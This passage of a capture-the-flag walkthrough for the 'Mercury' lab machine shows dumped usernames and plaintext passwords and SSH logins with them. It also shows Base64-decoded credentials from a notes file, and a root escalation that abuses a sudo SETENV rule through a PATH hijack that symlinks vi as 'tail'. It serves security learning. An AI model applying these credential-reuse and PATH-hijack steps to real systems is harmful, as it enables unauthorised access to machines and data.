### Try SSH with theses username and passwords

```
Table: users
[4 entries]
+----+-------------------------------+-----------+
| id | password                      | username  |
+----+-------------------------------+-----------+
| 1  | johnny1987                    | john      |
| 2  | lovemykids111                 | laura     |
| 3  | lovemybeer111                 | sam       |
| 4  | mercuryisthesizeof0.056Earths | webmaster |
+----+-------------------------------+-----------+
```

```
ssh webmaster@192.168.56.115

```

You will find out that the connection with username webmaster is working.

![[user_flag.png]]


---
---
---

# Privilege Escalation

webmaster is not able to use the sudo command

check out the mercury_proj directory, you will find a notes.txt with Base64 strings

```txt
webmaster@mercury:~/mercury_proj$ cat notes.txt 
Project accounts (both restricted):
webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK
linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==
```

```
echo "bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK" | base64 -d
mercuryisthesizeof0.056Earths

echo "bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==" | base64 -d
mercurymeandiameteris4880km
```

### Try again SSH with the linuxmaster username

`ssh linuxmaster@192.168.56.115`

```
linuxmaster@mercury:~$ id
uid=1002(linuxmaster) gid=1002(linuxmaster) groups=1002(linuxmaster),1003(viewsyslog)
```

### Local privilege Escalation

```sh
linuxmaster@mercury:~$ sudo -l
[sudo] password for linuxmaster: 
Matching Defaults entries for linuxmaster on mercury:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User linuxmaster may run the following commands on mercury:
    (root : root) SETENV: /usr/bin/check_syslog.sh

linuxmaster@mercury:~$ cat /usr/bin/check_syslog.sh
#!/bin/bash
tail -n 10 /var/log/syslog

# 
linuxmaster@mercury:~$ ln -s /usr/bin/vi tail
linuxmaster@mercury:~$ export PATH=$(pwd):$PATH
linuxmaster@mercury:~$ sudo --preserve-env=PATH /usr/bin/check_syslog.sh

```

## Get the Root Flag 🚩

```
root@mercury:/home/linuxmaster# id
uid=0(root) gid=0(root) groups=0(root)
root@mercury:/home/linuxmaster# cd /root
root@mercury:~# ls
root_flag.txt
root@mercury:~# cat root_flag.txt
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@/##////////@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@(((/(*(/((((((////////&@@@@@@@@@@@@@
@@@@@@@@@@@((#(#(###((##//(((/(/(((*((//@@@@@@@@@@
@@@@@@@@/#(((#((((((/(/,*/(((///////(/*/*/#@@@@@@@
@@@@@@*((####((///*//(///*(/*//((/(((//**/((&@@@@@
@@@@@/(/(((##/*((//(#(////(((((/(///(((((///(*@@@@
@@@@/(//((((#(((((*///*/(/(/(((/((////(/*/*(///@@@
@@@//**/(/(#(#(##((/(((((/(**//////////((//((*/#@@
@@@(//(/((((((#((((#*/((///((///((//////(/(/(*(/@@
@@@((//((((/((((#(/(/((/(/(((((#((((((/(/((/////@@
@@@(((/(((/##((#((/*///((/((/((##((/(/(/((((((/*@@
@@@(((/(##/#(((##((/((((((/(##(/##(#((/((((#((*%@@
@@@@(///(#(((((#(#(((((#(//((#((###((/(((((/(//@@@
@@@@@(/*/(##(/(###(((#((((/((####/((((///((((/@@@@
@@@@@@%//((((#############((((/((/(/(*/(((((@@@@@@
@@@@@@@@%#(((############(##((#((*//(/(*//@@@@@@@@
@@@@@@@@@@@/(#(####(###/((((((#(///((//(@@@@@@@@@@
@@@@@@@@@@@@@@@(((###((#(#(((/((///*@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@%#(#%@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

Congratulations on completing Mercury!!!
If you have any feedback please contact me at SirFlash@protonmail.com
[root_flag_69426d9fda579afbffd9c2d47ca31d90]
root@mercury:~#
```


![[root_flag.png]]
